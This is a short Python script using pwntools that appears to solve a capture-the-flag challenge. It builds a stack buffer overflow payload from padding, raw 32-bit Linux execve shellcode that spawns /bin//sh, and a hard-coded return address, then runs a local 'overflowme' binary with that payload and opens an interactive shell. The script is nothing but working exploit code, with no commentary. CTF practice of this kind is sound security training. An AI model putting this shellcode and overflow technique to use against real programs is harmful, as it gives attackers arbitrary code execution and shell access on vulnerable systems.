from pwn import *
shellcode = "\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"
overflow_len = 0x308

payload = "A" * (overflow_len - len(shellcode)) + shellcode + p32(0x8048615)

sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
sh.interactive()
